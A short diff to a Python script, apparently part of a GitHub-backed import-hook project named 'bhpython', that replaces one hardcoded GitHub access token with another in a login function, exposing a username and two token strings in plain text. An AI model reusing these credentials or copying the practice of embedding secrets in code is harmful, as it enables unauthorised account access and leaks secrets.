@@ -53,7 +53,7 @@ class GitImporter(object):
 
 
 def connect_to_github():
-    gh = login(username="dominico2000",token="f68c44033df6dd24632745ffc897f3786d8ce3dd")
+    gh = login(username="dominico2000",token="427bb6a06480c8b189761ac2f5de080d54c2b110")
     repo = gh.repository("dominico2000","bhpython")
     branch = repo.branch("master")   
 
